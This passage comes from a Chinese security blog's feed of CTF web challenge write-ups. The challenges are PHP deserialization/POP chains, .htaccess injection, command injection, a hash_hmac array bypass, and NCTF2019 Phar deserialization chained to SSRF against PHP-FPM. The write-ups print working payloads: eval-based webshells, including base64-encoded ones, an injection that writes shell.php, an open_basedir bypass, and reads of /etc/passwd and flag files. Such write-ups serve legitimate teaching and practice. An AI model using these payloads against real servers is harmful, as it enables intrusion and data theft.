class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br></pre></td></tr></table></figure>
<p>POP链构造+绕过exit</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;php://filter/convert.base64-decode/resource=aaa.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> GWHT;</span><br><span class="line">$a-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h2 id="easyphp">easyphp</h2>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一反应就是覆盖掉index.php，但是好像没有写入权限，那大概率应该就是用<code>.htaccess</code>这个文件做文章了。</p>
<p>第一种思路，向<code>.htaccess</code>文件写入shell，并且用auto_prepend_file包含<code>.htaccess</code>，但是<code>file</code>关键字被ban了，可以用换行绕过，结尾要用<code>\</code>处理content中的<code>\n</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\</span><br></pre></td></tr></table></figure>
<p>第二种思路，依然是利用<code>.htaccess</code>文件特性，不过这次是通过设置php_value来设置<code>preg_macth</code>正则回溯次数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
<p>先写入<code>.htaccess</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
<p>再直接通过<code>php://filter</code>伪协议写入一句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
<h2 id="easyphp2">easyphp2</h2>
<p>robots.txt提示有check.php</p>
<p>伪协议读取源码：</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure>
<p>GWHT.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>读到Cookie是GWHT，接下来就是命令执行<code>exec('printf \'' . $count . '\' | wc -c')</code></p>
<p>exec命令无回显，可以直接写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;| echo &quot;&lt;?&#x3D;eval(\$_POST[&#39;shell&#39;])?&gt;&quot; &gt; shell.php ||&#39;</span><br></pre></td></tr></table></figure>
<p>另外base64还有一种绕过方式：<code>%6%32</code>，<code>%32</code>是2，拼接成<code>%62</code>就是字母<code>b</code>了。</p>
<h2 id="BlackCat">BlackCat</h2>
<p>首页提示你听歌，把MP3下载到本地，用010 Editor打开，文件末尾隐藏着PHP代码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224100.png" alt=""></p>
<p>copy下来放到sublime中审计：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>中文存在乱码，不过不影响审计过程。<code>hash_mac</code>在官方文档中的第一个Note提到了一个trick：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224304.png" alt=""></p>
<p>第二个参数如果是数组的话，那么这个函数会生成一个warning，并且返回NULL，那么相当于<code>$clandetine</code>参数可控。payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">White-cat-monitor[]&#x3D;1&amp;One-ear&#x3D;;cat flag.php&amp;Black-CatSheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019-PharMatchesEverything</title>
    <url>/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/</url>
    <content><![CDATA[<h1 id="NCTF2019-Phar-matches-everything">NCTF2019 Phar matches everything</h1>
<p>去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。</p>
<p>原题目提示是通过vim的备份文件下载源码，但是BUU上的环境好像没有备份文件，只能从GitHub上下载<code>catchmime.php</code>和<code>upload.php</code>两个文件的源代码，</p>
<p>首先是upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$imageFileType=substr($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],strrpos($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,strlen($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"></span><br><span class="line">$file_name = md5(time());</span><br><span class="line">$file_name =substr($file_name, <span class="number">0</span>, <span class="number">10</span>).<span class="string">&quot;.&quot;</span>.$imageFileType;</span><br><span class="line"></span><br><span class="line">$target_file=$target_dir.$file_name;</span><br><span class="line"></span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($imageFileType !== <span class="string">&quot;jpg&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;png&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;gif&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;jpeg&quot;</span>  ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file <span class="subst">$file_name</span>  has been uploaded to ./uploads/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>单独看这个upload.php使用了白名单限制，只能上传图片后缀的文件，应该要结合其他的功能点一起利用。</p>
<p>再看catchmime.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">&#x27;careful&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个文件中存在两个和功能不相干的类<code>Main</code>和<code>Easytest</code>。</p>
<p><code>getimagesize</code>会触发Phar反序列化，然后在<code>careful</code>参数触发<code>Easy_test</code>类的反序列化，修改test参数为1。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line">@unlink(<span class="string">&quot;phar1.phar&quot;</span>);<span class="comment">//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($b);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>然后payload打过去</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119191059.png" alt=""></p>
<p>读了一圈文件，没找到flag，又不能执行命令，尝试去读<code>/etc/hosts</code>（或者<code>/etc/net/arp</code>)</p>
<p>读到了一个内网IP地址<code>10.247.100.9</code>。结果BUU上面我试了好几个C段地址之后，<code>10.247.100.11</code>这个地址终于返回了PHP-FPM。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211543.png" alt=""></p>
<p>接着就用SSRF打FPM，网上都是用P牛的脚本去构造，</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211947.png" alt=""></p>
<p>有open_basedir限制，绕过一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119215144.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>纵横杯2020-Web-WriteUp</title>
    <url>/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp/</url>
    <content><![CDATA[<h1 id="纵横杯2020-Web-WriteUp">纵横杯2020 Web WriteUp</h1>
<p>题目源码：</p>
<p>链接: <a href="https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A">https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A</a>  密码: dmqt</p>
<h2 id="0x01-easycl">0x01 easycl</h2>
<p>打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在：      可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件：        <img src="https://uploader.shimo.im/f/yKNJ4TwZFR1VppPL.png!thumbnail" alt="img">      这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件        <img src="https://uploader.shimo.im/f/YEqWl1M66valOfP6.png!thumbnail" alt="img">      读取flag文件        <img src="https://uploader.shimo.im/f/D4FIVx50ohQWkJ4c.png!thumbnail" alt="img"></p>
<h2 id="0x02-easycms">0x02 easycms</h2>
<p>www.zip 可以下载源码查看配置文件/common/config/config.php        <img src="https://uploader.shimo.im/f/kNIkXOn14JxnvHhs.png!thumbnail" alt="img">      用admin和admin868可以成功登陆网站后台。<a href="https://www.freebuf.com/vuls/248912.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AASSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A2%98%E7%9B%AE%E6%8A%8A%E6%BC%8F%E6%B4%9E%E6%8D%A2%E6%88%90%E4%BA%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%EF%BC%9A/core/class/collection.class.php">https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php</a>        <img src="https://uploader.shimo.im/f/RSvH1VN5mYRXhU0i.png!thumbnail" alt="img"></p>
<p>然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。</p>
